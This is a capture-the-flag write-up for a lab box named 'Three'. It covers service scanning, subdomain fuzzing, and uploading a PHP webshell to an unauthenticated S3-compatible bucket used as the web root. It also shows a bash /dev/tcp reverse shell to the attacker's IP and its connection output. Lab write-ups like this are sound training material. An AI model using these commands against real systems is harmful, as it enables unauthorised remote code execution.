
## CTF Writeup: Three

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.227.248
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 18:49 -0500
Nmap scan report for 10.129.227.248
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.66 seconds
```

There is an HTTP Webpage running on port 80 & SSH.

Identified that the actual domain is called thetoppers.htb from the e-mail. Let's map the target ip address to the domain in our local dns file.

```
echo "10.129.227.248 thetoppers.htb" | tee -a /etc/hosts
```

Enumerated subdomains & found an interesting subdomain.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" -fs 11952
```

We got an valid hit by specifying all Server Response Codes.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" -fs 11952 -mc all
```

I mapped the subdomain s3.thepoppers.htb to the target ip address in my local dns file.

```
mousepad /etc/hosts
```

S3 hints at Amazon S3 Cloud, let's utilize an tool called "aws cli" to enumerate the target server.

1. We need to configure the awscli.

```
aws configure

Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

We can list all of the S3 Buckets hosted by the server by using the ls command.

```
aws s3 ls --endpoint=http://s3.thetoppers.htb
2026-08-12 18:49:05 thetoppers.htb
```

We can also use the ls command to list objects and common prefixes under the specified bucket.

```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2026-08-12 18:49:05          0 .htaccess
2026-08-12 18:49:05      11952 index.php
```

This seems to be the web-root, so the apache webserver is using the S3 bucket as storage.
awscli allows us to upload/copy files to a remote bucket. 

Let's upload an webshell onto the S3 Bucket.

```
aws --endpoint=http://s3.thetoppers.htb s3 cp /opt/tools/wolfswebshell.php s3://thetoppers.htb
```

Gained Command Execution.

Started up netcat listener on my local machine.

```
nc -lvnp 8080
```

Executed the following bash reverse shell in my webshell.

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.44/8080 0>&1'
```

Gained RCE.

```
nc -lvnp 8080                                                
listening on [any] 8080 ...
connect to [10.10.14.44] from (UNKNOWN) [10.129.227.248] 35164
bash: cannot set terminal process group (1487): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/tmp$
```

Retrieved flag.txt in /var/www directory.

```
a980d99281a28d638ac68b9bf9453c2b
```